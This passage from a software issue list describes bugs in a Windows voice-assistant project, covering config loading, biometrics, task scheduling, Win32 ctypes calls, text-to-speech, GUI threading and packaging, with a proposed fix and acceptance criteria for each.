3. Remove hardcoded `python_version = "3.11"` (or match CI runner) and install cross-platform runtime typing deps (`numpy`, `beautifulsoup4`, `requests`, `httpx`, `psutil`) in `main_darius-ai.yml` Gate 1.

### Acceptance Criteria
- [ ] `mypy --python-version 3.12 src/` with full `.venv` dependencies installed reports `0` errors.
- [ ] PR CI (`main_darius-ai.yml`) and Release CI (`release.yml`) run equivalent Mypy stub checks.

---

## Issue W2-08: `[BUG] config_loader._SCHEMA Silently Strips assistant.language and llm.antigravity_api_key on Every Restart (+ target_dossier cfg.get Bug)`

- **Labels:** `bug`, `help wanted`, `good first issue`
- **Affected Files:**
  - `src/darius_ai/core/config_loader.py` (lines 483–513, 575–607, 689)
  - `src/darius_ai/gui/byok_settings.py` (lines 1028–1032)
  - `src/darius_ai/core/target_dossier.py` (line 193)

### Description & Root Cause
1. `_validate_types()` (`config_loader.py:575-607`) builds a new dictionary iterating strictly over `_SCHEMA` keys and discarding any undeclared keys. Because `"language"` is missing from `_SCHEMA["assistant"]` (`lines 484-487`), `"antigravity_api_key"` is missing from `_DEFAULTS["llm"]` and `_SCHEMA["llm"]`, and `"antigravity"` is absent from `_SCHEMA`, saving Spanish (`cfg.set_language("es")`) or saving an Antigravity API key in Settings is **silently wiped on the next startup** (resetting `cfg.language` back to `"en"`).
2. `target_dossier.py:193` calls `cfg.get("exa_api_key", "")`. Because `_Config.get(self, *keys, default=None)` treats positional arguments as nested dict keys, `""` is interpreted as a sub-key, always returning `None` even when `"exa_api_key"` exists.

### Verified Reproduction / Evidence
Empirically verified: `_validate_types(_deep_merge(_DEFAULTS, {"assistant": {"language": "es"}, "llm": {"antigravity_api_key": "secret"}}), _SCHEMA)` drops both `assistant.language` and `llm.antigravity_api_key` (`False`).

### Proposed Fix
1. Add `"language": str` to `_SCHEMA["assistant"]`, `"antigravity_api_key": ""` / `str` to `_DEFAULTS["llm"]` and `_SCHEMA["llm"]`, and optionally `"exa_api_key": str` (plus remove redundant top-level `antigravity.*` writes in `byok_settings.py:1031-1032` or add `"antigravity"` to `_SCHEMA`).
2. Fix `target_dossier.py:193` to `cfg.get("exa_api_key", default="")`.
3. Add a `_DEFAULTS` ↔ `_SCHEMA` parity assertion in `tests/test_config_loader.py`.

### Acceptance Criteria
- [ ] `cfg.set_language("es")` and Antigravity API keys survive reload/restart via `_load()`.
- [ ] `target_dossier.py` resolves `exa_api_key` via `default=""`.

---

## Issue W2-09: `[BUG] FaceBiometricsEngine.verify_face_frame() Crashes With Uncaught ValueError on Every Real NumPy Frame + VideoCapture Leak`

- **Labels:** `bug`, `help wanted`, `good first issue`
- **Affected Files:**
  - `src/darius_ai/core/face_biometrics.py` (lines 197, 272–280, 291–308, 361–364)

### Description & Root Cause
1. Line 197 sits **outside** the `try:` block and checks `if gray_frame_roi is None or gray_frame_roi == "":`. In real execution (`webcam_sentinel.py:259` or `verify_live_user()` line 328), `gray_frame_roi` is a 2D `np.ndarray`. Evaluating `bool(np.zeros((50, 50), dtype=np.uint8) == "")` raises:
   `ValueError: The truth value of an array with more than one element is ambiguous. Use a.any() or a.all().`
   Existing unit tests missed this because `test_face_biometrics.py:116` passes a `str` (`"dummy_frame"`).
2. In `verify_live_user()` (`lines 272-308`), `cv2.VideoCapture` is not released when `not cap.isOpened()` and lines 291–306 run outside `try...finally`.
3. `get_biometric_greeting()` (`lines 361-364`) instantiates a full `FaceBiometricsEngine()` (loading `face_model.yml` from disk) per call merely to format a greeting string.

### Proposed Fix
1. Replace line 197 with safe type/size guards:
   ```python
   if (
       gray_frame_roi is None
       or (isinstance(gray_frame_roi, str) and gray_frame_roi == "")
       or (hasattr(gray_frame_roi, "size") and gray_frame_roi.size == 0)
   ):
   ```
2. Wrap the entire `VideoCapture` lifetime in a single `try...finally: cap.release()`.
3. Make greeting formatting a `@staticmethod` on `FaceBiometricsEngine`.

### Acceptance Criteria
- [ ] Passing a real 2D `np.ndarray` frame to `verify_face_frame()` never raises `ValueError`.
- [ ] `VideoCapture` handles are always released on both failure and success paths.

---

## Issue W2-10: `[BUG] TaskScheduler Never Executes Scheduled Tasks in Production (executor_callback=None), Ignores CRON Expressions & Breaks ONCE UTC Comparison`

- **Labels:** `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/core/task_scheduler.py` (lines 76, 82–90, 117–129, 198–209, 253–269, 298–310)
  - `src/darius_ai/gui/app.py` (lines 292–295)

### Description & Root Cause
1. `app.py:294-295` calls `get_task_scheduler().start()` without passing `executor_callback`, and no code in `src/` ever sets `executor_callback`. Due tasks are fetched every 10s (`lines 301-306`), never executed, and remain `active` forever.
2. `ScheduleType.CRON` ignores `schedule_value` completely in both `_compute_initial_next_run()` (`lines 127-128`) and `mark_executed()` (`lines 264-265`), hardcoding `now + timedelta(hours=1)`.
3. `ScheduleType.ONCE` persists raw user `schedule_value` strings (`line 120`) and `get_due_tasks()` filters via SQL string comparison `WHERE next_run <= ?` against UTC `isoformat()`, breaking any timezone offset (`-05:00`), `"Z"` suffix, or malformed date string.
4. `ScheduleType.INTERVAL` permits `<= 0` seconds (causing an infinite tight loop), and `_connection()` runs `PRAGMA journal_mode = WAL` on every read query (acquiring write locks during 10s polls).

### Proposed Fix
1. Wire a real `executor_callback` in `app.py` (and warn if `start()` is invoked without one).
2. Implement/integrate a 5-field cron evaluator with validation; normalize `ONCE` timestamps to UTC ISO-8601; reject `interval <= 0` (enforce minimum `1.0s`).
3. Move `PRAGMA journal_mode = WAL` into `_init_db()` instead of `_connection()`.

### Acceptance Criteria
- [ ] Scheduled tasks execute through `app.py` when due.
- [ ] `CRON` expressions compute accurate next timestamps; `ONCE` normalizes timezone offsets to UTC.

---

## Issue W2-11: `[BUG] Missing ctypes argtypes/restype in workspace_manager.py Causes 64-bit HANDLE/HWND Truncation, OverflowError & Process Handle Leaks`

- **Labels:** `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/system/workspace_manager.py` (lines 80, 166–214, 227–239, 274–290)

### Description & Root Cause
On 64-bit Windows (`ctypes.sizeof(c_void_p) == 8`), `ctypes` defaults `restype` and untyped Python `int` arguments to signed 32-bit `c_int`. Empirically verified: passing a 64-bit handle (`0x1_0001_0002`) into untyped `ctypes.windll.user32.IsWindowVisible` raises `ctypes.ArgumentError: argument 1: OverflowError: int too long to convert`.
- `OpenProcess`, `GetForegroundWindow`, and `GetWindow` truncate 64-bit `HANDLE`/`HWND` returns to 32 bits.
- Corrupted `hproc` values cause `CloseHandle(hproc)` to fail, leaking OS process handles.
- In `bring_window_to_foreground()` (`lines 234-238`), `AttachThreadInput(..., False)` is missing `try...finally` and fails to guard `tid_fg != tid_tgt` or check the attachment return `BOOL`.

### Proposed Fix
Declare module-private `WinDLL("user32", use_last_error=True)` and `WinDLL("kernel32", use_last_error=True)` instances with explicit `argtypes`/`restype` (`wintypes.HWND`, `wintypes.HANDLE`, `wintypes.LPARAM`, `wintypes.DWORD`, `wintypes.BOOL`), and guard `AttachThreadInput` cleanly inside `try...finally`.

### Acceptance Criteria
- [ ] Zero untyped `ctypes.windll` calls remain in `workspace_manager.py`.
- [ ] Mocked 64-bit handle tests (`0x1_0001_0002`) pass without `OverflowError` or truncation.

---

# 🟠 HIGH ISSUES (`W2-12` – `W2-24`)

---

## Issue W2-12: `[BUG] Emergency Tactical Silence / Lockdown Unmutes Muted Hosts, Leaves Active TTS Talking & Leaks SQLite Connections`

- **Labels:** `bug`, `security`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/core/darius_lockdown.py` (lines 58–105, 122–138)
  - `src/darius_ai/gui/bento_dashboard.py` (lines 946–952)
  - `src/darius_ai/gui/app.py` (lines 276–277)

### Description & Root Cause
1. `trigger_tactical_silence()` calls `ctrl.toggle_mute()` (`VK_VOLUME_MUTE`), which **unmutes** an already-muted system or toggles sound back on if invoked twice.
2. `app.py` never calls `get_darius_lockdown_engine().register_tts_worker(self.tts_worker)`, so `_tts_worker` is `None`; even when set, `darius_lockdown.py:73` only calls `clear_queue()` instead of `interrupt()`, leaving active speech playing, and `bento_dashboard.py:952` calls `self.app_ref.talk(msg)` immediately after muting.
3. `_checkpoint_database()` uses `with sqlite3.connect(...)` (which manages transactions, not closing connections), ignores the returned `(busy, log, checkpointed)` row, and `LockWorkStation()` return `BOOL` (`0` on failure) is ignored.

### Proposed Fix
Register `tts_worker` in `app.py`; implement idempotent `MediaController.set_mute(True)` via `pycaw`; call `interrupt()`; close SQLite connections with `contextlib.closing` and verify `row[0] == 0`; check `bool(windll.user32.LockWorkStation())`.

### Acceptance Criteria
- [ ] Repeated `trigger_tactical_silence()` calls keep system audio muted and abort active speech immediately.
- [ ] SQLite WAL connections close deterministically and check checkpoint status.

---

## Issue W2-13: `[BUG] Guaranteed AttributeError Crash Between DeepResearchAgent and WebSearchEngine + Divergent Research Subsystems`

- **Labels:** `bug`, `refactor`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/core/deep_research_agent.py` (lines 22–33, 108–123)
  - `src/darius_ai/core/web_search_engine.py` (lines 28–36, 74–109)
  - `src/darius_ai/core/deep_research.py` (lines 218–251)
  - `src/darius_ai/core/agentic_bridge.py` (lines 411–418)
  - `src/darius_ai/core/agent_planner.py` (lines 241–256)

### Description & Root Cause
1. `deep_research_agent.py:22-33` defines a stub `WebSearchEngine` returning `list[dict]`, while `agentic_bridge.py:415` and `agent_planner.py:247` inject canonical `web_search_engine.WebSearchEngine()` which returns `list[SearchResult]` dataclasses. Whenever search returns results, `deep_research_agent.py:114` runs `r.get("url", "")`, raising `AttributeError: 'SearchResult' object has no attribute 'get'` (unhandled crash in `agentic_bridge.py`; silent fallback in `agent_planner.py`).
2. `deep_research.py` and `deep_research_agent.py` have diverged: `deep_research.py:219-243` saves error strings to Obsidian as `ok=True` when `provider == "error"`, and `deep_research_agent.py` leaves `self.code_interpreter` unused and ignores `depth`.

### Proposed Fix
Normalize `SearchResult` vs `dict` (or drop the shadow `WebSearchEngine`), consolidate `deep_research.py` and `deep_research_agent.py` onto one SSRF-safe pipeline, and check `provider == "error"` and `saved_path is not None`.

### Acceptance Criteria
- [ ] `DeepResearchAgent` works seamlessly with canonical `web_search_engine.WebSearchEngine` (`SearchResult` objects).
- [ ] AI errors are not archived to Obsidian as successful reports.

---

## Issue W2-14: `[BUG] get_ai_response() Witty-Retort Fast-Path Hijacks Legitimate Queries, Planner JSON, Research Reports & Dossiers`

- **Labels:** `bug`, `help wanted`, `good first issue`
- **Affected Files:**
  - `src/darius_ai/core/ai_client.py` (lines 883–896)
  - `src/darius_ai/core/darius_persona.py` (lines 203–357, 510–523)

### Description & Root Cause
`get_ai_response()` runs `DariusPersona.get_witty_retort(prompt, fallback=False)` before any LLM call. Because `WITTY_PATTERNS` uses unanchored word regexes (`the best`, `thanks`, `excellent`, `awesome`, `basura`, `gracias`, `alma`, `joke`, `chiste`), legitimate prompts and internal multi-KB web/Obsidian prompts get intercepted.

### Verified Reproduction / Evidence
- `"What is the best Python framework?"` → returns `"Think nothing of it, señor. I endeavor to maintain standards at the expected caliber."` without calling the LLM.
- `"Explica la recoleccion de basura en Java"` → returns an insult retort without calling the LLM.
- Web snippets containing `"thanks"` or `"the best"` inside `AgentPlannerEngine.create_plan()`, `DeepResearch`, or `TargetDossierEngine` corrupt structured JSON plans and dossiers.

### Proposed Fix
Add `allow_witty_fastpath: bool = False` to `get_ai_response()` (enabled only for interactive chat inputs `len(prompt) < 120` matching full-utterance intent patterns rather than arbitrary substring words).

### Acceptance Criteria
- [ ] Technical questions (`"best Python framework"`, `"recoleccion de basura"`) and all internal planner/research calls always reach the LLM.

---

## Issue W2-15: `[BUG] System Prompt [ACTION: ...] Kwarg Contract Mismatch in AgenticBridge & Broken AgentPlanner Contracts (KeyError: 'summary', Stub workflow_run)`

- **Labels:** `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/core/ai_client.py` (lines 338–350, 815–842)
  - `src/darius_ai/core/agentic_bridge.py` (lines 273–302, 364–377, 441–447)
  - `src/darius_ai/core/agent_planner.py` (lines 219–222, 337–341, 579–587, 617–631)
  - `src/darius_ai/gui/app.py` (lines 2318–2323)

### Description & Root Cause
1. `ai_client.py` instructs LLMs to emit kwargs (`[ACTION: scrape_web(url="https://...")]`, `human_hotkey(keys="ctrl+v")`, `top_processes(count=5)`, `science_oracle(query="...")`), but `AgenticBridge` forwards raw `key="value"` text verbatim—causing `Unsupported URL scheme: ''`, failed hotkeys falsely reported as `(True, ...)`, and literal `"query=\"foo\""` lookups.
2. In `agent_planner.py`: `plan_and_execute()` returns `{"ok": False, "error": "..."}` without `"summary"`, crashing `app.py:2323` with `KeyError: 'summary'`; `workflow_run` uses a no-op stub `_exec_node`; `news_sentinel`, `visual_ocr(clipboard)`, and `dialogue_stack` (`push`/`pop`/`clear`) fall through miswired to `AgenticBridge`; and line 221 overwrites any empty string field with unscanned `prev_result`.

### Proposed Fix
Parse positional/kwarg syntax cleanly in `AgenticBridge`, always include `"summary"` in `plan_and_execute()`, wire `_exec_node` to `self.execute_step()`, handle `news_sentinel`/`visual_ocr`/`dialogue_stack` explicitly, and restrict `prev_result` substitution to explicit `{{PREV}}` tokens.

### Acceptance Criteria
- [ ] `[ACTION: scrape_web(url="...")]`, `human_hotkey(keys="...")`, `top_processes(count=5)`, and `science_oracle(query="...")` parse cleanly.
- [ ] `plan_and_execute()` never triggers `KeyError: 'summary'` in `app.py` on failure paths; `workflow_run` executes real step actions.

---

## Issue W2-16: `[BUG] Broken Win32 Unicode Typing (keybd_event + KEYEVENTF_UNICODE), Hotkey VK Collisions (ctrl+. -> Ctrl+Delete) & Stuck Keys in human_input.py`

- **Labels:** `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/automation/human_input.py` (lines 290–298, 315, 340–371)

### Description & Root Cause
1. `press_unicode_char()` (`lines 296-298`) calls `user32.keybd_event(0, ord(char), KEYEVENTF_UNICODE, 0)`. Per Win32 documentation, `keybd_event` ignores `KEYEVENTF_UNICODE` and accepts only an 8-bit `BYTE` scan code (`SendInput` with 16-bit UTF-16 `KEYBDINPUT.wScan` is required).
2. In `human_hotkey()` (`lines 353-354`), falling back to `ord(norm_k.upper())` collides with Win32 Virtual-Key constants: `ord('.') == 0x2E == VK_DELETE`, `ord('-') == 0x2D == VK_INSERT`, `ord(',') == 0x2C == VK_SNAPSHOT` — so `human_hotkey("ctrl", ".")` sends **`Ctrl+Delete`**.
3. Key/mouse release calls lack `try...finally`, leaving modifier keys stuck on `FailsafeError`; `wpm=0` raises `ZeroDivisionError`.

### Proposed Fix
Use `user32.SendInput` with UTF-16 encoding for `press_unicode_char()`, restrict `ord()` fallback to `[A-Z0-9]` (using `VkKeyScanW` for punctuation), wrap press/release blocks in `try...finally`, and clamp `wpm = max(1, wpm)`.

### Acceptance Criteria
- [ ] Non-ASCII Spanish characters (`á`, `ñ`, `¿`) type reliably via `SendInput`.
- [ ] `human_hotkey("ctrl", ".")` never dispatches `VK_DELETE`.
- [ ] Exceptions mid-hotkey or mid-click always release held modifiers/buttons.

---

## Issue W2-17: `[BUG] _CMD_PATTERNS Ordering Shadows 4 Local Handlers, "unmute" Always Mutes, and GUI Volume Buttons Crash With TypeError`

- **Labels:** `bug`, `help wanted`, `good first issue`
- **Affected Files:**
  - `src/darius_ai/gui/app.py` (lines 188–192, 805, 818, 2039–2098, 2452–2462)
  - `tests/test_commands_v6.py` (lines 1051–1061)

### Description & Root Cause
1. In `_CMD_PATTERNS`, generic catch-all regexes precede specific handlers:
   - `"escribe en mi diario ..."` matches `_RE_HUMAN_TYPE` before `_RE_DIARIO`.
   - `"busca en obsidian ..."`, `"search in my notes ..."`, and `"buscar actualizaciones"` match `_cmd_buscar` (opening Google) before `_RE_BUSCAR_NOTAS` / `_RE_ACCION`.
   - `"apágate"` matches `_cmd_cerrar` before `_RE_APAGAR`.
2. `_cmd_vol_mute` matches `"unmute"`, yet `volume_mute()` (`lines 188-192`) hardcodes `SetMute(1, None)`, muting instead of unmuting.
3. GUI buttons (`lines 805, 818`) wire `command=self._cmd_vol_up` and `command=self._cmd_vol_down` with 0 args, raising `TypeError: missing 1 required positional argument: '_'`.
4. `TestPatternsMatchMain` (`test_commands_v6.py:1051`) only checks handler-name sets, hiding pattern ordering regressions.

### Proposed Fix
Order specific patterns (`_RE_DIARIO`, `_RE_MEMORIA`, `_RE_BUSCAR_NOTAS`, `_RE_APAGAR`, `_RE_REINICIAR`, `_RE_ACCION`) before generic ones; handle `"unmute"` explicitly via `SetMute(0, None)`; default `_cmd_vol_up(self, _=None)` and `_cmd_vol_down(self, _=None)`; test routing against `_REAL_PATTERNS`.

### Acceptance Criteria
- [ ] Conflicting phrases route unambiguously to Obsidian, Windows Update, Shutdown, and Unmute handlers.
- [ ] Clicking GUI Volume Up/Down buttons works cleanly without `TypeError`.

---

## Issue W2-18: `[BUG] Broken EdgeTTS -> SAPI5 Fallback, Ignored rate/volume Params, Temp File/MCI Collisions & TTSWorker Echo-Tail / wait_until_done() Races`

- **Labels:** `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/audio/tts_worker.py` (lines 51–92, 119–129, 144–167)
  - `src/darius_ai/audio/edge_tts_engine.py` (lines 45–50, 104–150)

### Description & Root Cause
1. `TTSWorker._speak_edge_tts()` discards `EdgeTTS.speak()`'s `bool` return value and hardcodes `return True`, making the SAPI5 fallback (`line 76`) unreachable on failure.
2. `EdgeTTS` stores `rate` and `volume` without passing them to `edge_tts.Communicate()`, names temp MP3s and MCI aliases with `id(text)` (colliding across concurrent calls), omits `try...finally` around `close {alias}` (holding Windows file locks on error), and overwrites/closes the thread's asyncio loop inside `except RuntimeError:`.
3. `TTSWorker._run()` clears `self.is_speaking` *before* `time.sleep(cfg.speaking_tail_secs)` (allowing acoustic echo feedback), `wait_until_done()` returns while the final utterance is still speaking (only checking `_queue.empty()`), `sapi_speaker` ignores runtime rate/volume changes, and `interrupt()` misses `winsound.PlaySound(None, SND_PURGE)`.

### Proposed Fix
Return `bool(tts.speak(text))`; convert `rate`/`volume` into `edge-tts` strings; use `uuid.uuid4().hex` for temp files/MCI aliases with `try...finally: close {alias}`; sleep `speaking_tail_secs` *before* `is_speaking.clear()`; and wait on `is_speaking.is_set()` in `wait_until_done()`.

### Acceptance Criteria
- [ ] Failed `EdgeTTS` synthesis falls back cleanly to SAPI5.
- [ ] Concurrent EdgeTTS calls do not collide on temp files or MCI aliases and honor `rate`/`volume`.

---

## Issue W2-19: `[BUG] Unsynchronized Global sounddevice.play() Aborts Active TTS on Concurrent SFX & Missing CoInitialize Breaks pycaw on Worker Threads`

- **Labels:** `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/audio/sound_effects.py` (lines 99, 122–236)
  - `src/darius_ai/system/media_controller.py` (lines 196–266)
  - `src/darius_ai/audio/elevenlabs_tts_engine.py` (lines 162–163)
  - `src/darius_ai/audio/tts_cache.py` (lines 104–105)
  - `src/darius_ai/core/darius_protocol.py` (lines 169–172)

### Description & Root Cause
1. Every call to `sounddevice.play()` executes process-global `sd.stop()`, so concurrent SFX (such as `darius_protocol.py:170-172` or timer alerts) terminate active ElevenLabs/cached TTS speech (and `ProceduralSFX._lock` is unused, plus `generate_tone_wave()` hardcodes 44.1 kHz regardless of `self._sample_rate`).
2. `MediaController._get_pycaw_endpoint()` invokes `AudioUtilities.GetSpeakers()` without calling `comtypes.CoInitialize()`, throwing `CO_E_NOTINITIALIZED` on every worker thread. Consequently `get_volume_percent()` always returns hardcoded `50` and `set_volume_percent()` falls back to flashing PowerShell `WScript.Shell.SendKeys` windows (missing `CREATE_NO_WINDOW`).

### Proposed Fix
Switch SFX and TTS PCM playback to dedicated `sounddevice.OutputStream` instances (pass `sample_rate=self._sample_rate`), and wrap `pycaw` calls in `CoInitialize`/`CoUninitialize` plus `CREATE_NO_WINDOW` on Windows PowerShell fallbacks.

### Acceptance Criteria
- [ ] Procedural SFX chimes do not abort ongoing ElevenLabs or cached WAV speech.
- [ ] `get_volume_percent()` and `set_volume_percent()` operate natively via `pycaw` inside background worker threads.

---

## Issue W2-20: `[BUG] GUI Lifecycle & Thread-Safety Bugs in app.py & bento_dashboard.py (Cross-Thread Tk Mutation, Broken Close, Import-Time Mutex, Sync Net I/O)`

- **Labels:** `bug`, `performance`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/gui/app.py` (lines 99–107, 407, 1394–1423, 1511–1520)
  - `src/darius_ai/gui/bento_dashboard.py` (lines 954–964)

### Description & Root Cause
1. `reset_conversation()` (`app.py:1511-1518`) mutates `self.chat_display` directly from background threads invoked via `execute_command`.
2. `CyberTopBar(..., on_close=self.destroy)` (`app.py:407`) bypasses `kill_process()`, leaving threads, schedulers, and Win32 mutex handles running.
3. Importing `app.py` acquires the Win32 named Mutex at module import time (`lines 99-107`) and invokes blocking `messagebox.showerror` + `sys.exit(0)` if another instance exists, hanging headless `--self-test` or parallel test runs.
4. `_is_network_available()` (`1s` TCP connect on every 5s status update) and `BentoDashboardView._on_request_situational_briefing()` (`5s` HTTP ISS lookup) execute synchronously on the Tkinter main thread.

### Proposed Fix
Marshal `chat_display` updates onto `self.after(0, ...)`; pass `on_close=self.kill_process`; move Mutex creation into an explicit entrypoint helper called only from `main.py`; offload network checks and ISS briefing fetches to daemon worker threads.

### Acceptance Criteria
- [ ] Importing `src.darius_ai.gui.app` produces zero Win32 Mutex or modal GUI side effects.
- [ ] Clicking Top Bar `✕` shuts down all background subsystems cleanly; network outages never freeze the HUD.

---

## Issue W2-21: `[BUG] Concurrency & Lifecycle Races in AcousticDoubleClapDetector and WebcamSentinel (Orphaned Streams, Stuck RUNNING State & Camera Contention)`

- **Labels:** `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/audio/acoustic_trigger.py` (lines 137–166, 200–248, 311–312)
  - `src/darius_ai/core/webcam_sentinel.py` (lines 137–154, 202–270)
  - `src/darius_ai/gui/app.py` (lines 2709–2724)

### Description & Root Cause
1. `AcousticDoubleClapDetector.stop()` neither joins `self._thread` nor interrupts the 4–10s `auto_select_best_mic()` scan. Toggling the detector off/on starts Thread 2 while Thread 1 is probing; Thread 1's `finally: self._running = False` then kills Thread 2.
2. `WebcamSentinel.start()`/`stop()` lack `self._lock`, use blocking `time.sleep()` instead of `_stop_event.wait()`, fail to check `cv2.CascadeClassifier(...).empty()`, leave `_state = SentinelState.RUNNING` stuck permanently after exceptions, and `_trigger_async_biometrics()` (`line 148`) tries to open the same exclusive Windows webcam via `verify_live_user()`. Neither sentinel nor timer/live engine are stopped in `kill_process()`.

### Proposed Fix
Use per-generation `threading.Event` cancellation inside `acoustic_trigger.py` and join previous threads cleanly; guard `WebcamSentinel` lifecycle with `self._lock`, check `.empty()`, reset `_state = STOPPED` in `finally:`, restrict async biometrics to `verify_face_frame(face_roi)`, and invoke `.stop()` in `app.py:kill_process()`.

### Acceptance Criteria
- [ ] Rapidly toggling acoustic detection or webcam sentinel never orphans threads or corrupts `_running`/`_state`.

---

## Issue W2-22: `[BUG] Provider Alias Mismatch (nvidia_nim vs nvidia) Causes KeyError & Silent Gemini Fallback + Modal Post-Destroy TclError & 25x Disk Writes`

- **Labels:** `bug`, `help wanted`, `good first issue`
- **Affected Files:**
  - `src/darius_ai/gui/byok_settings.py` (lines 47, 165, 183, 746–751, 816, 846, 1009, 1023–1072)
  - `src/darius_ai/core/ai_client.py` (lines 71–72, 908–918, 1021)
  - `README.es.md` (line 255), `docs/index.es.html` (line 279)

### Description & Root Cause
1. Spanish docs and `resolve_provider_key()` (`ai_client.py:77`) accept `"nvidia_nim"`, yet `get_ai_response()`, `test_provider_connection()`, and `BYOKSettingsModal` only recognize `"nvidia"`. Setting `active_provider="nvidia_nim"` silently routes AI calls to Gemini and triggers an immediate `KeyError: 'nvidia_nim'` in `BYOKSettingsModal`.
2. Scheduled UI callbacks (`byok_settings.py:846, 1009, 1072`) fail to check `self.winfo_exists()`, raising `TclError` if the modal closes while testing or within 1.2s of saving.
3. `_on_save()` performs ~25 individual `cfg.set()` calls (rewriting and renaming `config.json` 25 times per click), `resolve_provider_key("antigravity")` ignores `cfg.llm_antigravity_api_key`, `hints` omits `"antigravity"`, and `"gemini-3.6-flash"` remains in `PROVIDER_DEFAULT_MODELS` despite being deprecated.

### Proposed Fix
Normalize `"nvidia_nim" -> "nvidia"`, fallback unknown providers cleanly in `BYOKSettingsModal`, check `winfo_exists()` in scheduled callbacks, batch save via `cfg.update_many()`, honor `cfg.llm_antigravity_api_key`, and update Spanish docs/presets.

### Acceptance Criteria
- [ ] `nvidia_nim` aliases normalize cleanly with zero `KeyError`; modal dismissal during async tests produces zero `TclError`.
- [ ] `_on_save()` performs a single atomic config flush.

---

## Issue W2-23: `[ENHANCEMENT] Complete End-to-End Dual-Language i18n Wiring Across app.py, byok_settings.py, bento_dashboard.py, SAPI5 & Oracles`

- **Labels:** `enhancement`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/gui/app.py` (lines 318, 466–934, 1104–1105, spoken handlers)
  - `src/darius_ai/gui/byok_settings.py` (lines 111–115, 147, 284–715, 953, 975)
  - `src/darius_ai/gui/bento_dashboard.py` (lines 638–651, 741–751)
  - `src/darius_ai/core/ai_client.py` (lines 425–440, 845–850, 894, 925, 953)
  - `src/darius_ai/core/{news_sentinel,orbital_radar,air_traffic_sentinel,seismic_sensor,space_weather_oracle,science_oracle,daily_digest,darius_protocol}.py` & `telemetry_bar.py`

### Description & Root Cause
Even when `cfg.language == "en"` (default):
- `app.py` never imports `t(...)`: 25+ spoken/status strings (`_cmd_detener`, `_cmd_apagar_pc`, `_cmd_vol_*`, `_cmd_estado`, `ask_gemini`, etc.) and 4 sub-pages stay hardcoded in Spanish, and `setup_tts_config()` selects Spanish SAPI5 voices (`["spanish", "helena", ...]`).
- `bento_dashboard.set_core_state()` overwrites `core_status_lbl` back to Spanish `"SISTEMA NOMINAL • EN ESPERA"` every 16ms frame; card titles and situational metrics stay Spanish.
- `byok_settings.py` hardcodes Spanish window title/tabs (breaking `if "MODELO" in tab_name:` if localized naively), `TTS_ENGINES`, form labels, Edge-TTS test voice (`es-MX-DaliaNeural`), and test string (`"Hola Óscar..."`).
- `ai_client.py` omits `language=cfg.language` when invoking `DariusPersona.get_witty_retort()` and `format_butler_response()`; oracles and `science_oracle.py` unit conversions emit/parse Spanish only.

### Proposed Fix
Wire `t(...)` across `app.py`, `byok_settings.py`, `bento_dashboard.py`, `telemetry_bar.py`, and oracle formatters; pass `language=cfg.language` to `DariusPersona`; match English SAPI5 voices when `cfg.language == "en"`; support English `"to"` unit conversions in `science_oracle.py`.

### Acceptance Criteria
- [ ] Running with `language="en"` displays 100% English UI widgets, SAPI5/Edge voices, error messages, and oracle briefings.
- [ ] Toggling `en <-> es` refreshes all tabs and widgets without reverting on render ticks.

---

## Issue W2-24: `[BUG] Packaging & Installer Defects: pyproject.toml Layout Mismatch, Missing Win32 Markers in requirements.txt, Personal Defaults in config.template.json & Spanish-Only Version-Locked installer.iss`

- **Labels:** `bug`, `documentation`, `help wanted`
- **Affected Files:**
  - `pyproject.toml` (lines 1–38)
  - `requirements.txt` (lines 27–29)
  - `config.template.json` (lines 4–5, 34, 40, 46, 50–51, 69–70)
  - `installer.iss` (lines 15, 37–54)
  - `build_nuitka.py` (lines 107, 114)

### Description & Root Cause
1. Without `[tool.setuptools.packages.find]` and with `src/__init__.py` present, `pip install .` packages `darius_ai` rather than `src.darius_ai`, breaking all `from src.darius_ai...` imports outside the repo root (`pyproject.toml` also lacks `[project.scripts]`).
2. `requirements.txt` omits `; sys_platform == 'win32'` on `pywin32`, `comtypes`, and `pycaw`.
3. `config.template.json` (bundled as default `config.json` in `.exe` builds) sets `"tts.engine": "elevenlabs"` with empty API key (forcing an ElevenLabs error on every utterance), `"user_name": "Oscar"`, a personal Spotify URI, `tasaradar.com`, and a Spanish `welcome_phrase` while `"language": "en"`.
4. `installer.iss` embeds `V850` inside `AppId` (preventing automatic upgrades across minor releases) and ships only the Spanish wizard UI.

### Proposed Fix
Add `; sys_platform == 'win32'` in `requirements.txt`; fix setuptools package discovery (or normalize package layout) + add console/gui entrypoint; ship neutral `sapi` defaults in `config.template.json`; add English `[Languages]` + stable `AppId` in `installer.iss`.

### Acceptance Criteria
- [ ] `pip install .` resolves imports cleanly and `pip install -r requirements.txt` parses safely on Linux runners.
- [ ] Fresh `.exe` installs default cleanly to SAPI5 offline TTS and neutral user settings.

---

# 🟡 MEDIUM & 🔵 LOW ISSUES (`W2-25` – `W2-35`)

---

## Issue W2-25: `[BUG] DariusDialogueStack Auto-Confirms Actions on Empty/1-Char Input & Misclassifies "si"/"no" Substrings`
- **Labels:** `bug`, `security`, `help wanted`, `good first issue`
- **Affected Files:** `src/darius_ai/core/dialogue_stack.py` (lines 168, 204–228)
- **Root Cause & Fix:** Line 206 checks `len(k) >= 3` but not `len(norm_input) >= 3`, allowing empty/punctuation STT (`""`, `"?"`) or 1-char noise (`"a"`) to match `norm_input in k` and auto-trigger the first queued option. Unanchored `"si"`/`"no"` substring matching classifies `"no cerrar sesion"` as affirmative (`"si"` in `"sesion"`) and `"notificar"` as negative. Bail out when `not norm_input`, require `len(norm_input) >= 3`, and use `\bsi\b` / `\bno\b` word-boundary regexes.
- **Acceptance Criteria:**
  - [ ] Empty, punctuation-only, and 1-char inputs return unresolved `(False, ...)`.
  - [ ] Spanish words containing `"si"` or `"no"` as substrings do not invert confirmation polarity.

## Issue W2-26: `[BUG] LoopGuard Ping-Pong/3-Cycle Detectors Never Escalate WARN -> BLOCK & WorkflowDAG Executes Nodes Whose Upstream Dependencies Were Skipped`
- **Labels:** `bug`, `help wanted`, `good first issue`
